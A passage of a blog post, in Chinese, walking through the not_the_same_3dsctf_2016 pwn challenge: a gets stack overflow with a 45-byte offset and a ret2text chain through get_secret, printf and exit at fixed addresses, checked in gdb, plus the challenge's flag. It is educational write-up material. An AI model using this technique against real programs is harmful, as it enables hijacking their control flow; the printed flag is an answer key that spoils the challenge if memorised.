@@ -1,0 +1,1046 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾 | Quellisya's Blog</title><meta name="author" content="Quellisya"><meta name="copyright" content="Quellisya"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f3fbf8"><meta name="description" content="这道题把 32 位 ret2text 的完整链路走了一遍：get_secret 只把 flag 读进全局变量、不打印，所以要在栈上手工搭出 get_secret → printf(flag) → exit 的假调用栈。重点讲清楚 45 字节偏移怎么从 sub esp,0x3c 和 v4 的 esp+0xf 算出来、cdecl 的参数位置、为什么必须用 exit 收尾，以及 gdb 里 telesc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾">
+<meta property="og:url" content="https://quellisya.github.io/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/index.html">
+<meta property="og:site_name" content="Quellisya&#39;s Blog">
+<meta property="og:description" content="这道题把 32 位 ret2text 的完整链路走了一遍：get_secret 只把 flag 读进全局变量、不打印，所以要在栈上手工搭出 get_secret → printf(flag) → exit 的假调用栈。重点讲清楚 45 字节偏移怎么从 sub esp,0x3c 和 v4 的 esp+0xf 算出来、cdecl 的参数位置、为什么必须用 exit 收尾，以及 gdb 里 telesc">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://quellisya.github.io/img/avatar-seal.svg">
+<meta property="article:published_time" content="2026-11-14T07:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-14T07:00:00.000Z">
+<meta property="article:author" content="Quellisya">
+<meta property="article:tag" content="32位">
+<meta property="article:tag" content="3dsctf2016">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="cdecl">
+<meta property="article:tag" content="exit">
+<meta property="article:tag" content="gdb">
+<meta property="article:tag" content="gets">
+<meta property="article:tag" content="printf">
+<meta property="article:tag" content="pwndbg">
+<meta property="article:tag" content="pwntools">
+<meta property="article:tag" content="ret2text">
+<meta property="article:tag" content="栈溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://quellisya.github.io/img/avatar-seal.svg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾",
+  "url": "https://quellisya.github.io/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/",
+  "image": "https://quellisya.github.io/img/avatar-seal.svg",
+  "datePublished": "2026-11-14T07:00:00.000Z",
+  "dateModified": "2026-11-14T07:00:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Quellisya",
+      "url": "https://github.com/Quellisya"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/logo-seal.svg"><link rel="canonical" href="https://quellisya.github.io/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0f1f22')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#f3fbf8')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/butterfly-custom.css"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Quellisya's Blog" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg-ink-tech.svg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar-seal.svg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">98</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-layer-group"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fa-fw fab fa-github"></i><span> GitHub</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/banner-ink-tech.svg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo-seal.svg" alt="Logo"><span class="site-name">Quellisya's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-layer-group"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fa-fw fab fa-github"></i><span> GitHub</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-14T07:00:00.000Z" title="发表于 2026-11-14 15:00:00">2026-11-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-14T07:00:00.000Z" title="更新于 2026-11-14 15:00:00">2026-11-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/Pwn/">Pwn</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/Pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container">
+<nav class="series-nav">
+  <div class="series-nav__head">
+    <i class="fas fa-layer-group"></i>
+    <span class="series-nav__name">系列：Pwn 入门</span>
+    <span class="series-nav__count">第 5 / 5 篇</span>
+  </div>
+  <ol class="series-nav__list"><li><a href="&#x2F;2026&#x2F;11&#x2F;02&#x2F;pwn-ctf-rip&#x2F;">Pwn 工具的基本使用：从搭环境到 BUUCTF rip 拿 shell</a></li><li><a href="&#x2F;2026&#x2F;11&#x2F;05&#x2F;pwn-ctf-warmup-csaw-2016&#x2F;">Pwn 热身：CSAW 2016 warmup——没有符号表也能定位 main，两种方法绕过栈对齐</a></li><li><a href="&#x2F;2026&#x2F;11&#x2F;06&#x2F;pwn-ctf-ciscn-2019-n-1&#x2F;">Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证</a></li><li><a href="&#x2F;2026&#x2F;11&#x2F;10&#x2F;pwn-ctf-get-started-3dsctf-2016&#x2F;">Pwn 入门：get_started_3dsctf_2016——32 位栈传参、cdecl 与用 exit 收尾</a></li><li class="is-current"><a href="&#x2F;2026&#x2F;11&#x2F;14&#x2F;pwn-ctf-not-the-same-3dsctf-2016&#x2F;">Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾</a></li></ol>
+  <div class="series-nav__links"><a class="series-nav__prev" href="&#x2F;2026&#x2F;11&#x2F;10&#x2F;pwn-ctf-get-started-3dsctf-2016&#x2F;"><i class="fas fa-arrow-left"></i>Pwn 入门：get_started_3dsctf_2016——32 位栈传参、cdecl 与用 exit 收尾</a></div>
+</nav><div class="note primary flat"><p><strong>一分钟速览</strong></p>
+<ul>
+<li><strong>难度</strong>：入门（做完 <a href="/2026/11/10/pwn-ctf-get-started-3dsctf-2016/">get_started</a> 之后，正好接着练 32 位栈传参）</li>
+<li><strong>考点</strong>：32 位 cdecl 栈传参、<code>gets</code> 栈溢出、ret2text、给利用函数“喂”参数、用 <code>printf</code> 输出、用 <code>exit</code> 冲刷缓冲区</li>
+<li><strong>工具</strong>：<code>file</code>、<code>checksec</code>、IDA、gdb + pwndbg、<code>objdump</code>、pwntools</li>
+<li><strong>漏洞点</strong>：<code>gets(v4)</code>，<code>v4</code> 在 <code>esp+0xf</code></li>
+<li><strong>偏移</strong>：<code>0x3c - 0xf = 0x2d = 45</code>（这题<strong>没有</strong>保存的 ebp 要跳过）</li>
+<li><strong>利用函数</strong>：<code>get_secret</code>，地址 <code>0x080489a0</code>，只把 flag 读进全局变量 <code>fl4g</code>，不打印</li>
+<li><strong>输出函数</strong>：<code>printf</code>，地址 <code>0x0804f0a0</code></li>
+<li><strong>收尾函数</strong>：<code>exit</code>，地址 <code>0x0804e660</code></li>
+<li><strong>payload</strong>：<code>45</code> 字节填充 + <code>get_secret</code> + <code>printf</code> + <code>exit</code> + <code>fl4g</code>，共 <code>61</code> 字节</li>
+<li><strong>flag</strong>：<code>CTF2{6f7ca70d-79fa-4834-affe-59b333f1206d}</code></li>
+</ul>
+</div>
+
+<div class="note info flat"><p><strong>阅读说明</strong></p>
+<ul>
+<li><strong>前置知识</strong>：C 语言函数调用、栈的基本概念、会用 gdb 和 pwntools（前面四篇都讲过）</li>
+<li><strong>环境</strong>：Linux（Kali &#x2F; Ubuntu），IDA、gdb + pwndbg、pwntools</li>
+<li><strong>靶场</strong>：文中的地址是当时平台的临时环境，现在多半已经失效，请换成自己的靶场或本地环境</li>
+<li>本文所有操作仅用于<strong>授权靶场和教学</strong>，请勿对未授权的目标做任何测试</li>
+</ul>
+</div>
+
+<div class="note default flat"><p><strong>做题路线</strong></p>
+<p><code>file 看类型</code> → <code>checksec 看保护</code> → <code>IDA 看 main 算偏移</code> → <code>看 get_secret 发现不打印</code> → <code>找 printf 和 exit</code> → <code>画栈图</code> → <code>写 exp</code> → <code>gdb 验证栈布局</code> → <code>打远程拿 flag</code></p>
+</div>
+
+<h2 id="这道题为什么值得做"><a href="#这道题为什么值得做" class="headerlink" title="这道题为什么值得做"></a>这道题为什么值得做</h2><p>前面几道 32 位题里，后门函数通常已经写好了 <code>system(&quot;cat flag.txt&quot;)</code> 或者 <code>printf(flag)</code>，我们只要把返回地址改过去就行。</p>
+<p>这道题不一样：<strong>它有一个读 flag 的函数，但这个函数不输出。</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_secret</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它只是把 <code>flag.txt</code> 读进一个全局变量 <code>fl4g</code>，然后 <code>fclose</code> 返回。你直接跳过去，程序会安安静静地结束，屏幕上什么都没有。</p>
+<p>所以这题的核心不是“找后门”，而是：</p>
+<ol>
+<li>找到把 flag 读进来的函数；</li>
+<li>找到能把内存打印出来的函数；</li>
+<li><strong>在栈上手工搭一个调用，把第 1 步读到的地址作为参数传给第 2 步。</strong></li>
+</ol>
+<p>这就是“真正的攻击不会给你一个现成做好、调用就能跑通的函数”的意思。下面按完整流程走一遍。</p>
+<h2 id="第一步：file-与-checksec"><a href="#第一步：file-与-checksec" class="headerlink" title="第一步：file 与 checksec"></a>第一步：file 与 checksec</h2><p>先看文件类型：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file pwn7</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/image.png" alt="file 查看文件类型"></p>
+<p><em>图 1：32 位、静态链接、not stripped</em></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwn7: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux),</span><br><span class="line">statically linked, for GNU/Linux 2.6.32, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>逐段看：</p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>含义</th>
+<th>对做题的影响</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ELF 32-bit</code></td>
+<td>32 位可执行文件</td>
+<td>地址占 4 字节，exp 里用 <code>p32</code></td>
+</tr>
+<tr>
+<td><code>LSB</code></td>
+<td>小端序</td>
+<td>低字节放低地址，<code>p32</code> 会自动处理</td>
+</tr>
+<tr>
+<td><code>Intel 80386</code></td>
+<td>i386 架构</td>
+<td>参数走栈，不走寄存器</td>
+</tr>
+<tr>
+<td><code>statically linked</code></td>
+<td>静态链接</td>
+<td>libc 被打进程序，函数地址固定，不需要泄露 libc</td>
+</tr>
+<tr>
+<td><code>for GNU/Linux 2.6.32</code></td>
+<td>目标内核版本很老</td>
+<td>老题的常见痕迹</td>
+</tr>
+<tr>
+<td><code>not stripped</code></td>
+<td>符号表还在</td>
+<td>IDA &#x2F; gdb 里能直接看到函数名</td>
+</tr>
+</tbody></table>
+<p>静态链接是这道题最省事的地方：<code>printf</code>、<code>fopen</code>、<code>fgets</code>、<code>exit</code> 全都在程序自己的代码段里，地址是固定的，不用像动态链接那样先泄露 libc。</p>
+<p>再看保护：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=pwn7</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/image-1.png" alt="checksec 查看保护"></p>
+<p><em>图 2：No canary、NX enabled、No PIE</em></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">Stripped: No</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>本例</th>
+<th>一句话解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Arch</code></td>
+<td><code>i386-32-little</code></td>
+<td>32 位小端序，用 <code>p32</code></td>
+</tr>
+<tr>
+<td><code>RELRO</code></td>
+<td><code>Partial RELRO</code></td>
+<td>GOT 部分只读，但这题不涉及 GOT 劫持</td>
+</tr>
+<tr>
+<td><code>Stack</code></td>
+<td><code>No canary found</code></td>
+<td>没有栈金丝雀，可以直接覆盖返回地址</td>
+</tr>
+<tr>
+<td><code>NX</code></td>
+<td><code>NX enabled</code></td>
+<td>栈不可执行，不能放 shellcode</td>
+</tr>
+<tr>
+<td><code>PIE</code></td>
+<td><code>No PIE (0x8048000)</code></td>
+<td>程序基址固定，函数地址可以写死</td>
+</tr>
+<tr>
+<td><code>Stripped</code></td>
+<td><code>No</code></td>
+<td>符号表还在，找函数很方便</td>
+</tr>
+</tbody></table>
+<p>这题的保护组合很典型：</p>
+<ul>
+<li><strong>No canary</strong>：<code>gets</code> 可以一路写到返回地址；</li>
+<li><strong>No PIE</strong>：<code>get_secret</code>、<code>printf</code>、<code>exit</code> 的地址都是固定的；</li>
+<li><strong>NX enabled</strong>：不能执行栈上的 shellcode，但我们可以 <strong>ret2text</strong>，跳到程序自己的代码段，不需要执行新代码。</li>
+</ul>
+<h2 id="第二步：IDA-看-main，算偏移"><a href="#第二步：IDA-看-main，算偏移" class="headerlink" title="第二步：IDA 看 main，算偏移"></a>第二步：IDA 看 main，算偏移</h2><p>把 <code>pwn7</code> 拖进 IDA，找到 <code>main</code>，按 <code>F5</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">45</span>]; <span class="comment">// [esp+Fh] [ebp-2Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/image-2.png" alt="IDA 中的 main"></p>
+<p><em>图 3：<code>v4</code> 在 <code>esp+0xF</code>，<code>gets</code> 直接读进这个 45 字节的缓冲区</em></p>
+<p>代码很短，但有两个信息很关键：<code>v4</code> 在 <code>esp+0xF</code>，长度 45。</p>
+<p>再看汇编：</p>
+<p><img src="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/image-5.png" alt="main 的汇编"></p>
+<p><em>图 4：<code>sub esp,0x3c</code>、<code>lea eax,[esp+0xf]</code>、<code>call gets</code></em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x080489e0 &lt;+0&gt;:  sub  esp, 0x3c</span><br><span class="line">0x080489e3 &lt;+3&gt;:  mov  DWORD PTR [esp], 0x80bc2b...</span><br><span class="line">0x080489ea &lt;+10&gt;: call 0x804f0a0 &lt;printf&gt;</span><br><span class="line">0x080489ef &lt;+15&gt;: lea  eax, [esp+0xf]</span><br><span class="line">0x080489f3 &lt;+19&gt;: mov  DWORD PTR [esp], eax</span><br><span class="line">0x080489f6 &lt;+22&gt;: call 0x804f8d0 &lt;gets&gt;</span><br><span class="line">0x080489fb &lt;+27&gt;: xor  eax, eax</span><br><span class="line">0x080489fd &lt;+29&gt;: add  esp, 0x3c</span><br><span class="line">0x08048a00 &lt;+32&gt;: ret</span><br></pre></td></tr></table></figure>
+
+<h3 id="45-是怎么算出来的"><a href="#45-是怎么算出来的" class="headerlink" title="45 是怎么算出来的"></a>45 是怎么算出来的</h3><p>32 位 cdecl 下，<code>main</code> 被 <code>call</code> 进来时，栈顶 <code>[esp]</code> 就是<strong>返回地址</strong>。</p>
+<p>函数开头执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub esp, 0x3c</span><br></pre></td></tr></table></figure>
+
+<p>栈指针往下挪了 <code>0x3c</code> 字节。于是返回地址的位置变成：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">返回地址 = esp + 0x3c</span><br></pre></td></tr></table></figure>
+
+<p>而 <code>gets</code> 写入的缓冲区起点是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v4 = esp + 0xf</span><br></pre></td></tr></table></figure>
+
+<p>两者相减：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x3c - 0xf = 0x2d = 45</span><br></pre></td></tr></table></figure>
+
+<p>所以前 <strong>45 个字节</strong>是填充，第 46 个字节开始就是返回地址。</p>
+<h3 id="为什么没有保存的-ebp"><a href="#为什么没有保存的-ebp" class="headerlink" title="为什么没有保存的 ebp"></a>为什么没有保存的 ebp</h3><p>注意汇编里<strong>没有</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov  ebp, esp</span><br></pre></td></tr></table></figure>
+
+<p>编译器用了 <code>-fomit-frame-pointer</code>，直接用 <code>esp</code> 寻址。所以这题不需要像 64 位那样再填 8 字节保存的 <code>rbp</code>，45 字节之后直接就是返回地址。</p>
+<p>IDA 注释里的 <code>[ebp-2Dh]</code> 是它按“标准帧”推出来的初始偏移，数值也是 45；但既然函数没有 <code>push ebp</code>，<strong>真正可靠的是 <code>[esp+Fh]</code> 和 <code>sub esp,0x3c</code> 这一对</strong>。</p>
+<h3 id="画成栈图"><a href="#画成栈图" class="headerlink" title="画成栈图"></a>画成栈图</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">高地址</span><br><span class="line">+--------------------------+</span><br><span class="line">|  main 的返回地址 (4)     |  &lt;- esp + 0x3c</span><br><span class="line">+--------------------------+</span><br><span class="line">|  ... 栈帧里的其他空间 ... |</span><br><span class="line">+--------------------------+</span><br><span class="line">|  v4[45]                  |  &lt;- esp + 0xf   gets 从这里开始写</span><br><span class="line">+--------------------------+</span><br><span class="line">|  ...                     |</span><br><span class="line">+--------------------------+</span><br><span class="line">低地址  &lt;- esp</span><br></pre></td></tr></table></figure>
+
+<p><code>gets</code> 从 <code>v4</code> 往高地址写，先填满 45 字节，再往下就碰到返回地址。</p>
+<div class="note warning flat"><p><strong>不要看到 <code>sub esp,0x3c</code> 就直接写 60。</strong> <code>0x3c</code> 是整个栈帧的大小，不是缓冲区到返回地址的距离。缓冲区在 <code>esp+0xf</code>，所以是 <code>0x3c - 0xf = 45</code>。同一道题里，缓冲区位置换一下，偏移就完全不同。</p>
+</div>
+
+<h3 id="在-gdb-里验证"><a href="#在-gdb-里验证" class="headerlink" title="在 gdb 里验证"></a>在 gdb 里验证</h3><p>先下断点：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *main+22</span><br><span class="line">Breakpoint 2 at 0x80489f6</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/image-8.png" alt="在 gets 处下断点"></p>
+<p><em>图 5：<code>b *main+22</code> 正好停在 <code>call gets</code> 之前</em></p>
+<p><code>main+22</code> 就是 <code>0x80489f6</code>，也就是 <code>call gets</code> 那条指令。再在 <code>ret</code> 处下一个：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *main+32</span><br><span class="line">Breakpoint 3 at 0x8048a00</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/image-9.png" alt="在 ret 处下断点"></p>
+<p><em>图 6：<code>b *main+32</code> 停在 <code>ret</code>，这时 payload 已经写完</em></p>
+<p>运行后输入 <strong>45 个 A + 4 个 B</strong>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>ret</code> 处看栈：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8wx $esp</span><br></pre></td></tr></table></figure>
+
+<p>应该能看到返回地址被 <code>0x42424242</code> 覆盖。看到这个，就说明偏移算对了。</p>
